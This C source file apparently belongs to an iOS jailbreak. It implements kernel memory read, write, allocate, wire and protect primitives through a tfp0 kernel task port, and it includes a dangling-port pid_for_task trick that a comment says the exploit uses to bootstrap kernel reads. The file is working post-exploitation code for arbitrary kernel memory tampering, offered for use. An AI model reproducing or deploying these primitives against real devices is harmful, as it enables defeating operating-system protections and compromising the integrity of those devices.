#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "KernelMemory.h"
#include "KernelUtilities.h"
#include "../../headers/common.h"

//#include "kutils.h"
#include "kernel_memory.h"
#include "IOKit.h"
#include "offsets.h"

uint64_t task_port_kaddr = 0;
mach_port_t tfp0 = MACH_PORT_NULL;
mach_port_t kernel_task_port = MACH_PORT_NULL;
task_t v3tfp0 = MACH_PORT_NULL;
uint64_t v3task_port_kaddr = 0;


void increase_limits() {
    struct rlimit lim = {0};
    int err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to get limits\n");
    }
    // printf("rlim.cur: %lld\n", lim.rlim_cur);
    //printf("rlim.max: %lld\n", lim.rlim_max);
    
    lim.rlim_cur = 10240;
    
    err = setrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to set limits\n");
    }
    
    lim.rlim_cur = 0;
    lim.rlim_max = 0;
    err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to get limits\n");
    }
    printf("rlim.cur: %lld\n", lim.rlim_cur);
    printf("rlim.max: %lld\n", lim.rlim_max);
    
}


void wk32(uint64_t kaddr, uint32_t val) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    err = mach_vm_write(tfp0,
                        (mach_vm_address_t)kaddr,
                        (vm_offset_t)&val,
                        (mach_msg_type_number_t)sizeof(uint32_t));
    
    if (err != KERN_SUCCESS) {
        printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}

void wk64(uint64_t kaddr, uint64_t val) {
    uint32_t lower = (uint32_t)(val & 0xffffffff);
    uint32_t higher = (uint32_t)(val >> 32);
    wk32(kaddr, lower);
    wk32(kaddr+4, higher);
}


uint32_t rk32(uint64_t kaddr) {
    kern_return_t err;
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)sizeof(uint32_t),
                                 (mach_vm_address_t)&val,
                                 &outsize);
    if (err != KERN_SUCCESS){
        printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        usleep(3);
        return 0;
    }
    
    if (outsize != sizeof(uint32_t)){
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        usleep(3);
        return 0;
    }
    return val;
}

uint64_t rk64(uint64_t kaddr) {

    uint64_t lower = rk32(kaddr);
    uint64_t higher = rk32(kaddr+4);
    uint64_t full = ((higher<<32) | lower);
    return full;
}


// the exploit bootstraps the full kernel memory read/write with a fake
// task which just allows reading via the bsd_info->pid trick
// this first port is kmem_read_port
mach_port_t kmem_read_port = MACH_PORT_NULL;
void prepare_rk_via_kmem_read_port(mach_port_t port)
{
    kmem_read_port = port;
}

//mach_port_t kernel_task_port = MACH_PORT_NULL;
void prepare_rwk_via_tfp0(mach_port_t port)
{
    tfp0 = port;
    kernel_task_port = tfp0;
}

void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0)
{
    tfp0 = fake_tfp0;
    kernel_task_port = tfp0;

}

bool have_kmem_read()
{
    return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);
}

bool have_kmem_write()
{
    return (tfp0 != MACH_PORT_NULL);
}

size_t Mkread1(uint64_t where, void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0,
            where + offset,
            chunk,
            (mach_vm_address_t)p + offset,
            &sz);
        if (rv || sz == 0) {
            printf("error reading kernel @%p", (void*)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

size_t Mkwrite1(uint64_t where, const void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0,
            where + offset,
            (mach_vm_offset_t)p + offset,
            (mach_msg_type_number_t)chunk);
        if (rv) {
            printf("error writing kernel @%p", (void*)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

bool wkbufferM(uint64_t kaddr, void* buffer, size_t length)
{
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available");
        sleep(3);
        return false;
    }

    return (Mkwrite1(kaddr, buffer, length) == length);
}

bool rkbufferM(uint64_t kaddr, void* buffer, size_t length)
{
    return (kernel_read(kaddr, buffer, length) == length);
}

void MWriteKernel32(uint64_t kaddr, uint32_t val)
{
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available");
        sleep(3);
        return;
    }
    wkbufferM(kaddr, &val, sizeof(val));
}

void MWriteKernel64(uint64_t kaddr, uint64_t val)
{
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available");
        sleep(3);
        return;
    }
    wkbufferM(kaddr, &val, sizeof(val));
}

uint32_t rk32_via_kmem_read_port(uint64_t kaddr)
{
    kern_return_t err;
    if (kmem_read_port == MACH_PORT_NULL) {
        printf("kmem_read_port not set, have you called prepare_rk?");
        sleep(10);
        exit(EXIT_FAILURE);
    }

    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;
    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);
    if (err != KERN_SUCCESS) {
        printf("error setting context off of dangling port: %x %s", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }

    // now do the read:
    uint32_t val = 0;
    err = pid_for_task(kmem_read_port, (int*)&val);
    if (err != KERN_SUCCESS) {
        printf("error calling pid_for_task %x %s", err, mach_error_string(err));
        sleep(10);
        exit(EXIT_FAILURE);
    }

    return val;
}

uint32_t rk32_via_tfp0(uint64_t kaddr)
{
    uint32_t val = 0;
    rkbufferM(kaddr, &val, sizeof(val));
    return val;
}

uint64_t rk64_via_kmem_read_port(uint64_t kaddr)
{
    uint64_t lower = rk32_via_kmem_read_port(kaddr);
    uint64_t higher = rk32_via_kmem_read_port(kaddr + 4);
    uint64_t full = ((higher << 32) | lower);
    return full;
}

uint64_t rk64_via_tfp0(uint64_t kaddr)
{
    uint64_t val = 0;
    rkbufferM(kaddr, &val, sizeof(val));
    return val;
}


uint32_t MReadKernel32(uint64_t kaddr)
{
    if (tfp0 != MACH_PORT_NULL) {
        return rk32_via_tfp0(kaddr);
    }

    if (kmem_read_port != MACH_PORT_NULL) {
        return rk32_via_kmem_read_port(kaddr);
    }

    printf("attempt to read kernel memory but no kernel memory read primitives available");
    sleep(3);

    return 0;
}

uint64_t MReadKernel64(uint64_t kaddr)
{
    if (tfp0 != MACH_PORT_NULL) {
        return rk64_via_tfp0(kaddr);
    }

    if (kmem_read_port != MACH_PORT_NULL) {
        return rk64_via_kmem_read_port(kaddr);
    }

    printf("attempt to read kernel memory but no kernel memory read primitives available");
    sleep(3);

    return 0;
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void kmemcpy(uint64_t dest, uint64_t src, uint32_t length)
{
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        wkbufferM(dest, (void*)src, length);
    } else {
        // copy from kernel
        rkbufferM(src, (void*)dest, length);
    }
}

uint64_t kmem_alloc(uint64_t size)
{
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available");
        sleep(3);
        return 0;
    }

    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_allocate(tfp0, &addr, ksize, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        usleep(3);
        return 0;
    }
    return addr;
}

uint64_t kmem_alloc_wired(uint64_t size)
{
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to allocate kernel memory before any kernel memory write primitives available");
        usleep(3);
        return 0;
    }

    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);

    printf("vm_kernel_page_size: %lx", vm_kernel_page_size);

    err = mach_vm_allocate(tfp0, &addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        printf("unable to allocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        sleep(3);
        return 0;
    }

    printf("allocated address: %llx", addr);

    addr += 0x3fff;
    addr &= ~0x3fffull;

    printf("address to wire: %llx", addr);

    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ | VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        printf("unable to wire kernel memory via tfp0: %s %x", mach_error_string(err), err);
        sleep(3);
        return 0;
    }
    return addr;
}

void kmem_free(uint64_t kaddr, uint64_t size)
{
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to deallocate kernel memory before any kernel memory write primitives available");
        sleep(3);
        return;
    }

    kern_return_t err;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_deallocate(tfp0, kaddr, ksize);
    if (err != KERN_SUCCESS) {
        printf("unable to deallocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        sleep(3);
        return;
    }
}

void kmem_protect(uint64_t kaddr, uint32_t size, int prot)
{
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to change protection of kernel memory before any kernel memory write primitives available");
        sleep(3);
        return;
    }
    kern_return_t err;
    err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);
    if (err != KERN_SUCCESS) {
        printf("unable to change protection of kernel memory via tfp0: %s %x", mach_error_string(err), err);
        sleep(3);
        return;
    }
}
